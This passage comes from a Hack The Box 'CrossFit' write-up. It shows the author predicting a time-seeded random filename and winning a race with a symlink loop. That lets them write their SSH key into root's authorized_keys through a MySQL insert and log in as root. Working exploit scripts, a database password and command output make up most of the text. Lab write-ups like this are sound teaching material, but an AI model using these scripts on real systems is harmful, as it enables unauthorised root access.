  <span class="n">uVar4</span> <span class="o">=</span> <span class="n">zip_error_strerror</span><span class="p">(</span><span class="n">local_68</span><span class="p">);</span>
  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">uVar4</span><span class="p">);</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
  <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">process_data()</code> function opened a connection to the MySQL database and logged in. Then it pulled all of the data from the <code class="language-plaintext highlighter-rouge">messages</code> table and stored the result in a variable. It then opened the file <code class="language-plaintext highlighter-rouge">/var/backups/mariadb/comments.zip</code>. After opening the <code class="language-plaintext highlighter-rouge">messages</code> table and the zip file, it appeared that the program took each entry in the messages table and created a file in <code class="language-plaintext highlighter-rouge">/var/local</code> using the <code class="language-plaintext highlighter-rouge">md5sum</code> of the random number it creates as the filename, then added each file to the zip.</p><p>If I could create a file with the correct “random” filename in the <code class="language-plaintext highlighter-rouge">/var/local</code> directory and link it to a file of my choice before the program executed the write action, the output of my database entry in <code class="language-plaintext highlighter-rouge">message</code> would be written to the file (and therefore to the linked file). Whew, this was a bit complicated!</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>isaac@crossfit:/dev/shm$ cd /var/backups/mariadb
cd /var/backups/mariadb
bash: cd: /var/backups/mariadb: Permission denied
</pre></table></code></div></div><p>I tried to see what was in the backup zip file to see if I could validate my analysis of the program, but I was unable to access the directory that file was stored in.</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">time_t</span> <span class="n">tVar2</span>
    
    <span class="n">tVar2</span> <span class="o">=</span> <span class="n">time</span><span class="p">((</span><span class="kt">time_t</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
    <span class="n">srand</span><span class="p">((</span><span class="n">uint</span><span class="p">)</span><span class="n">tVar2</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="n">rand</span><span class="p">());</span>

    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>I did some research into creating a random number seed using C and then printing that number to a file.</p><ul><li><a href="https://www.tutorialspoint.com/c_standard_library/c_function_srand.htm">https://www.tutorialspoint.com/c_standard_library/c_function_srand.htm</a><li><a href="https://stackoverflow.com/questions/7343833/srand-why-call-it-only-once">https://stackoverflow.com/questions/7343833/srand-why-call-it-only-once</a></ul><p>I wrote a short function in C that emulated what the program was doing: using the current time to generate a pseudo-random number, then outputting that number to the terminal. I would use a script to use <code class="language-plaintext highlighter-rouge">md5sum</code> on the generated number and write it to a file since that would be much easier than writing a whole C program to do this.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>gcc rand.c -o /dev/shm/rand
</pre></table></code></div></div><p>I compiled the small program, then created a script to run it</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="c">#test.sh</span>
<span class="nb">touch</span> /var/local/testing
<span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do </span><span class="nb">ln</span> <span class="nt">-s</span> /var/local/testing /var/local/<span class="si">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="si">$(</span>/dev/shm/rand<span class="si">)</span>1 | <span class="nb">md5sum</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">" "</span> <span class="nt">-f</span> 1<span class="si">)</span> 2&gt;/dev/null<span class="p">;</span> <span class="k">done</span>
</pre></table></code></div></div><p>TODO:fix this paragraph., linking the file to root’s <code class="language-plaintext highlighter-rouge">authorized_users</code> and (hopefully!) writing my public SSH key to it.test script to see if I can write to random location and see if my output appears. update: test worked… automating process because its a pain, and deletes every thing so fast…The ‘1’ after running my random number program is the ID field value from my SQL statement.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
</pre><td class="rouge-code"><pre>hank@crossfit:/var/local$ ls -la
total 36
drwxrwsr-x  2 root  staff  4096 Mar 19 17:06 .
drwxr-xr-x 13 root  root   4096 May 11  2020 ..
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 0184fcf5cab878c6d7a4a238d9335fc9 -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 01c341c0f1905d4cf880c9d317ea198a -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 0e5a4f402a1d4e11e29fb881ddf551ac -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 1334ee445d94d2057adfd456f0f30e9f -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 2e7e418d626a8cf774ca86427247d470 -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 2f3d859545eac23b239cd02f2b382732 -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 32690d4ba5a11ce8d2acaea1fe9863ed -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 34b7cf174af7a7a7c7bd6640d2bf796f -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 37d02441bcf8b1a03096e5d85613343f -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 3aec496cb87b5275d783a6fbde97eda9 -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 3db43ad6c85de451942239f6334e035f -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 46e01464d466f3be2e2baacd7ce04b06 -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 4fa94e4efd4b5a8586492664b4114f81 -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 64872b594307597a0fb74a43518dbaf4 -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 65f05f00ce94f2f38010995a2d6b5df8 -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 6a885b24e1564d4aae3f8d057f85d1ac -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 6eb8a3b05d977417c959e357c018a0ee -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 76cb9159c5a2e23a03106c6c92d8899f -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 8afd3af05deff201efa18de9e88b5efd -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 957a7ab403c547a922f835f22dec3901 -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 98d65c2d6817aebb40c08e07527a3999 -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 a187a36ebd377ff2404e37992581e003 -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 abf37f52f83200875e4f7817627a5ce2 -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 b14feb3d616020463845b32b1a1c1d80 -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 b2e435eb990bf835103ef3213c3a90a2 -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 b4729e44d2099e46e11b776be529bc8f -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 c3fbaec6e5638c255648b740cb1d6ecf -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 caf3679893140588b1797d9936e175b0 -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 d41d8cd98f00b204e9800998ecf8427e -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 d4d2474363b7c42b66766d33b1e69b2f -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 d4fe8354ba56eb84a9d73c444bbcb73b -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 d663b4289b4f4592428ac65d99eed4a5 -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 dd1d1bbe442022290aa2689feec005ff -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 ddaf5badb189da9347b7afd71b8e9abd -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 e2fa52581e93721dd19fec36c1df1d3f -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 f1881aca5b246a1d4ecf260d27346ef7 -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 f286b210609b0685837f8e227f27b982 -&gt; /var/local/testing
lrwxrwxrwx  1 isaac staff    18 Mar 19 17:06 f994e5b9d588327131864b08f8d15bb9 -&gt; /var/local/testing
-rwxr-xr-x  1 isaac staff 16792 Mar 19 17:06 rand
-rw-r--r--  1 isaac staff   197 Mar 19 17:06 rand.c
-rwxr-xr-x  1 isaac staff   969 Mar 19 17:06 test
-rw-r--r--  1 isaac staff     0 Mar 19 17:06 testing
hank@crossfit:/var/local$ cat *
cat: d41d8cd98f00b204e9800998ecf8427e: No such file or directory
</pre></table></code></div></div><p>My random files were generated, and then suddenly and swiftly removed by the cleaning crew. I tried to do a test run, but the files were deleted so fast that I couldn’t get the <code class="language-plaintext highlighter-rouge">testing</code> file to stick around. I thought about trying to get the output to redirect to <code class="language-plaintext highlighter-rouge">/dev/tcp</code> to show up at a netcat listener on my machine, but I was confident that I had made it work and pushed on with trying to get <code class="language-plaintext highlighter-rouge">root</code> access.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>isaac@crossfit:~$ vi rand.c
isaac@crossfit:~$ gcc rand.c -o /dev/shm/rand
isaac@crossfit:~$ ls
rand.c  send_updates
isaac@crossfit:~$ rm rand.c
isaac@crossfit:~$ cd /dev/shm
isaac@crossfit:/dev/shm$ ls
rand
isaac@crossfit:/dev/shm$ chmod +x rand
</pre></table></code></div></div><p>I compiled my random file generator then made it executable (removing the evidence of its creation). After running it, (note: this is from before I automated all of this with my script later!)</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>isaac@crossfit:/var/local$ ls -la
total 8
drwxrwsr-x  2 root  staff 4096 Mar 19 16:15 .
drwxr-xr-x 13 root  root  4096 May 11  2020 ..
lrwxrwxrwx  1 isaac staff   26 Mar 19 16:15 c4ca4238a0b923820dcc509a6f75849b -&gt; /root/.ssh/authorized_keys
</pre></table></code></div></div><p>I added a line to my script that would insert my message into the database, ran my script, and saw the file linked to <code class="language-plaintext highlighter-rouge">root</code>’s <code class="language-plaintext highlighter-rouge">authorized_keys</code> file in the proper folder. However, I was not able to SSH into the machine.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>isaac@crossfit:/var/local$ /dev/shm/test.sh
ERROR 1364 (HY000) at line 1: Field 'name' doesn't have a default value
</pre></table></code></div></div><p>I scrolled up to check the error messages output from my script, and saw the error that had stopped it from working. My database query that I put in the script was only inserting my public key into the <code class="language-plaintext highlighter-rouge">messages</code> field. The database was not set up to function with <code class="language-plaintext highlighter-rouge">NULL</code> values in the other fields so it was not working. It required values in the other fields.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/dev/shm/test.sh: line 2: ./rand: No such file or directory
</pre></table></code></div></div><p>I was also receiving the second error message above that was caused by a cleanup script on the machine which regularly deleted all files in the <code class="language-plaintext highlighter-rouge">/tmp</code>, <code class="language-plaintext highlighter-rouge">/var/local</code>, and <code class="language-plaintext highlighter-rouge">/dev/shm</code> directories (and maybe more).</p><div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="n">MariaDB</span> <span class="p">[</span><span class="n">crossfit</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">DESCRIBE</span> <span class="n">messages</span><span class="p">;</span>
<span class="o">+</span><span class="c1">---------+---------------------+------+-----+---------+----------------+</span>
<span class="o">|</span> <span class="n">Field</span>   <span class="o">|</span> <span class="k">Type</span>                <span class="o">|</span> <span class="k">Null</span> <span class="o">|</span> <span class="k">Key</span> <span class="o">|</span> <span class="k">Default</span> <span class="o">|</span> <span class="n">Extra</span>          <span class="o">|</span>
<span class="o">+</span><span class="c1">---------+---------------------+------+-----+---------+----------------+</span>
<span class="o">|</span> <span class="n">id</span>      <span class="o">|</span> <span class="nb">bigint</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span> <span class="nb">unsigned</span> <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span> <span class="n">PRI</span> <span class="o">|</span> <span class="k">NULL</span>    <span class="o">|</span> <span class="n">auto_increment</span> <span class="o">|</span>
<span class="o">|</span> <span class="n">name</span>    <span class="o">|</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span>         <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span> <span class="k">NULL</span>    <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">email</span>   <span class="o">|</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">320</span><span class="p">)</span>        <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span> <span class="k">NULL</span>    <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">message</span> <span class="o">|</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span>       <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span> <span class="k">NULL</span>    <span class="o">|</span>                <span class="o">|</span>
<span class="o">+</span><span class="c1">---------+---------------------+------+-----+---------+----------------+</span>
<span class="mi">4</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">001</span> <span class="n">sec</span><span class="p">)</span>
</pre></table></code></div></div><p>After going back to my shell as <code class="language-plaintext highlighter-rouge">hank</code> and checking <code class="language-plaintext highlighter-rouge">mysql</code> I realized my problem. I was getting an error while inserting my key into the database, but since there was a huge spam of output from my script I didn’t see it. I used the <code class="language-plaintext highlighter-rouge">DESCRIBE</code> command to see the columns in the message table so I could tailor my input better.</p><div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="n">MariaDB</span> <span class="p">[</span><span class="n">crossfit</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">insert</span> <span class="k">into</span> <span class="n">messages</span> <span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">email</span><span class="p">,</span> <span class="n">message</span><span class="p">)</span> <span class="k">values</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nv">"ecdsa-sha2-nistp256"</span><span class="p">,</span> <span class="nv">"zweilos"</span><span class="p">,</span> <span class="nv">"AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOFDxKT5MSIXS3CMnjSZkAqDM+3+yMnUeK9XvRqNy0GQOpBkPhDiCYZekrPVKVM2jSsHfrMfc4P+bakquSG9g5c=C3NzaC1lZDI1NTE5AAAAIBpM8dQcTJXzXOsciQU22F4qpf1jv/SscvQAu+kz7np1"</span><span class="p">);</span>
<span class="n">Query</span> <span class="n">OK</span><span class="p">,</span> <span class="mi">1</span> <span class="k">row</span> <span class="n">affected</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">001</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">MariaDB</span> <span class="p">[</span><span class="n">crossfit</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">messages</span>
    <span class="o">-&gt;</span> <span class="p">;</span>
<span class="o">+</span><span class="c1">----+---------------------+---------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span>
<span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">name</span>                <span class="o">|</span> <span class="n">email</span>   <span class="o">|</span> <span class="n">message</span>                                                                                                                                                                                                      <span class="o">|</span>
<span class="o">+</span><span class="c1">----+---------------------+---------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span>
<span class="o">|</span>  <span class="mi">1</span> <span class="o">|</span> <span class="n">ecdsa</span><span class="o">-</span><span class="n">sha2</span><span class="o">-</span><span class="n">nistp256</span> <span class="o">|</span> <span class="n">zweilos</span> <span class="o">|</span> <span class="n">AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOFDxKT5MSIXS3CMnjSZkAqDM</span><span class="o">+</span><span class="mi">3</span><span class="o">+</span><span class="n">yMnUeK9XvRqNy0GQOpBkPhDiCYZekrPVKVM2jSsHfrMfc4P</span><span class="o">+</span><span class="n">bakquSG9g5c</span><span class="o">=</span><span class="n">C3NzaC1lZDI1NTE5AAAAIBpM8dQcTJXzXOsciQU22F4qpf1jv</span><span class="o">/</span><span class="n">SscvQAu</span><span class="o">+</span><span class="n">kz7np1</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">----+---------------------+---------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span>
<span class="mi">1</span> <span class="k">row</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">000</span> <span class="n">sec</span><span class="p">)</span>
</pre></table></code></div></div><p>I had to try a number of different entries, but in the end I had to break the public key into its three components and put them in the fields as seen above.</p><div class="table-wrapper"><table><thead><tr><th style="text-align: left">Field<th style="text-align: left">Value<tbody><tr><td style="text-align: left">name<td style="text-align: left">Key encryption type<tr><td style="text-align: left">email<td style="text-align: left">Username (on attacker machine)<tr><td style="text-align: left">message<td style="text-align: left">Public key content</table></div><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="k">if</span> <span class="p">(</span><span class="n">local_40</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
          <span class="n">fputs</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">local_38</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">local_40</span><span class="p">);</span>
          <span class="n">fputc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span><span class="n">local_40</span><span class="p">);</span>
          <span class="n">fputs</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">local_38</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span><span class="n">local_40</span><span class="p">);</span>
          <span class="n">fputc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span><span class="n">local_40</span><span class="p">);</span>
          <span class="n">fputs</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">local_38</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="n">local_40</span><span class="p">);</span>
          <span class="n">fclose</span><span class="p">(</span><span class="n">local_40</span><span class="p">);</span>
</pre></table></code></div></div><p>My SQL entry into the <code class="language-plaintext highlighter-rouge">message</code> database was based off of this section of the code from the <code class="language-plaintext highlighter-rouge">process_data()</code> function. It wrote the second field, the fourth field, then the third field to the file. This means that it wrote them in the order: name, message, email. These were separated by adding by a space (<code class="language-plaintext highlighter-rouge">0x20</code>) when it wrote to the file. I would need to match my entries to this format.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
<span class="c">#testsploit.sh</span>
<span class="nb">echo</span> <span class="s1">'#include &lt;stdio.h&gt;'</span> <span class="o">&gt;&gt;</span> rand.c
<span class="nb">echo</span> <span class="s1">'#include &lt;stdlib.h&gt;'</span> <span class="o">&gt;&gt;</span> rand.c
<span class="nb">echo</span> <span class="s1">'#include &lt;time.h&gt;'</span> <span class="o">&gt;&gt;</span> rand.c
<span class="nb">echo</span> <span class="s1">''</span> <span class="o">&gt;&gt;</span> rand.c
<span class="nb">echo</span> <span class="s1">'int main(void)'</span> <span class="o">&gt;&gt;</span> rand.c
<span class="nb">echo</span> <span class="s1">'{'</span> <span class="o">&gt;&gt;</span> rand.c
<span class="nb">echo</span> <span class="s1">'    srand(time(0));'</span> <span class="o">&gt;&gt;</span> rand.c
<span class="nb">echo</span> <span class="s1">'    printf("%d", rand());'</span> <span class="o">&gt;&gt;</span> rand.c
<span class="nb">echo</span> <span class="s1">'    return 0;'</span> <span class="o">&gt;&gt;</span> rand.c
<span class="nb">echo</span> <span class="s1">'}'</span> <span class="o">&gt;&gt;</span> rand.c
gcc rand.c <span class="nt">-o</span> rand
<span class="nb">chmod</span> +x ./rand
mysql <span class="nt">-h</span> localhost <span class="nt">-u</span> crossfit <span class="nt">-poeLoo</span>~y2baeni <span class="nt">-Dcrossfit</span> <span class="nt">-e</span><span class="s1">'insert into messages (id, name, email, message) values (1, "ssh-ed25519", "zweilos@kali", "AAAAC3NzaC1lZDI1NTE5AAAAIEJBS4TOdiQGcHfw8ifVbRk+tgzUlRPyEn9ogY0JogFO");'</span>
<span class="nb">touch</span> /var/local/testing
<span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do </span><span class="nb">ln</span> <span class="nt">-s</span> /root/.ssh/authorized_keys /var/local/<span class="si">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="si">$(</span>./rand<span class="si">)</span>1 | <span class="nb">md5sum</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">" "</span> <span class="nt">-f</span> 1<span class="si">)</span> 2&gt;/dev/null<span class="p">;</span> <span class="k">done</span>
</pre></table></code></div></div><p>I created a shell script to automate everything. It wrote the C source code to a file, compiled it into a binary, gave it the executable permission, inserted my properly formatted SQL statement into the database, and finally linked <code class="language-plaintext highlighter-rouge">/root/.ssh/authorized_keys</code> to my randomly generated file.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>hank@crossfit:/var/local$ ls -la
total 36
drwxrwsr-x  2 root  staff  4096 Mar 19 17:22 .
drwxr-xr-x 13 root  root   4096 May 11  2020 ..
lrwxrwxrwx  1 isaac staff    26 Mar 19 17:22 c4ca4238a0b923820dcc509a6f75849b -&gt; /root/.ssh/authorized_keys                                                                                                   
-rwxr-xr-x  1 isaac staff 16704 Mar 19 17:22 rand
-rw-r--r--  1 isaac staff   153 Mar 19 17:22 rand.c
-rwxr-xr-x  1 isaac staff   987 Mar 19 17:22 t
-rw-r--r--  1 isaac staff     0 Mar 19 17:22 testing
</pre></table></code></div></div><p>I verified that the randomly generated file was symlinked to <code class="language-plaintext highlighter-rouge">/root/.ssh/authorized_keys</code> and hoped that everything worked as planned.</p><h3 id="roottxt">Root.txt</h3><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/crossfit]
└─$ ssh root@10.10.10.208 -i root.key                                                            130 ⨯
Linux crossfit 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Sep 21 04:46:55 2020
root@crossfit:~# id &amp;&amp; hostname
uid=0(root) gid=0(root) groups=0(root)
crossfit
root@crossfit:~# ls -la
total 60
drwx------  9 root root 4096 Feb 16 05:14 .
drwxr-xr-x 18 root root 4096 Sep  2  2020 ..
lrwxrwxrwx  1 root root    9 May 12  2020 .bash_history -&gt; /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwx------  5 root root 4096 Apr 28  2020 .cache
-rwxr-x---  1 root root  179 May 13  2020 cleanup.sh
drwxr-xr-x  3 root root 4096 May  1  2020 .composer
drwx------  3 root root 4096 May  2  2020 .config
-rwx------  1 root root  136 May 12  2020 delete_ftp_users.sh
drwx------  3 root root 4096 Apr 28  2020 .gnupg
lrwxrwxrwx  1 root root    9 May 12  2020 .lesshst -&gt; /dev/null
drwxr-xr-x  3 root root 4096 May 26  2020 .local
drwx------  5 root root 4096 Apr 28  2020 .mozilla
lrwxrwxrwx  1 root root    9 May  4  2020 .mysql_history -&gt; /dev/null
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--------  1 root root   33 Mar 19 13:50 root.txt
-rw-r--r--  1 root root   74 May  5  2020 .selected_editor
drwx------  2 root root 4096 Sep  2  2020 .ssh
root@crossfit:~# cat root.txt 
ee0a62a5b513a67db05897a2ec478c80
</pre></table></code></div></div><p>Finally! I had to keep trying to log in through SSH, as it wasn’t until my files got deleted that I was successful. I was able to tell that my files got deleted because I suddenly began getting spammed with an error message from my script.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>...snipped...
./t: line 19: ./rand: No such file or directory
./t: line 19: ./rand: No such file or directory
./t: line 19: ./rand: No such file or directory
./t: line 19: ./rand: No such file or directory
./t: line 19: ./rand: No such file or directory
</pre></table></code></div></div><p>As you can see…I got tired of even typing out <code class="language-plaintext highlighter-rouge">test.sh</code> and simply called my script <code class="language-plaintext highlighter-rouge">t</code>. I almost was about to write another script that would send my files over, <code class="language-plaintext highlighter-rouge">chmod +x</code> them, and run the exploit script, but just before I did that the exploit finally worked!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/0-crossfit-pwned.png" alt="" /></p><p>Thanks to <a href="https://app.hackthebox.eu/users/159204"><code class="language-plaintext highlighter-rouge">polarbearer</code></a> &amp; <a href="https://app.hackthebox.eu/users/125033"><code class="language-plaintext highlighter-rouge">GibParadox</code></a> for creating such a fun and challenging machine. I am grateful that while it involved reverse engineering a C binary file, it did not involve advanced buffer overflows or anything like that (looking at you Rope and Rope2…). I had to learn a number of new things to complete this machine such as writing code in JavaScript and C, both of which I am not that familiar. Overall this was a great challenge and I definitely look forward to more like this!</p><p>If you have comments, issues, or other feedback, or have any other fun or useful tips or tricks to share, feel free to contact me on Github at <a href="https://github.com/zweilosec">https://github.com/zweilosec</a> or in the comments below!</p><p>If you like this content and would like to see more, please consider buying me a coffee! <a href="https://www.buymeacoffee.com/zweilosec"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&amp;emoji=&amp;slug=zweilosec&amp;button_colour=FFDD00&amp;font_colour=000000&amp;font_family=Lato&amp;outline_colour=000000&amp;coffee_colour=ffffff" /></a></p></div><script data-name="BMC-Widget" data-cfasync="false" 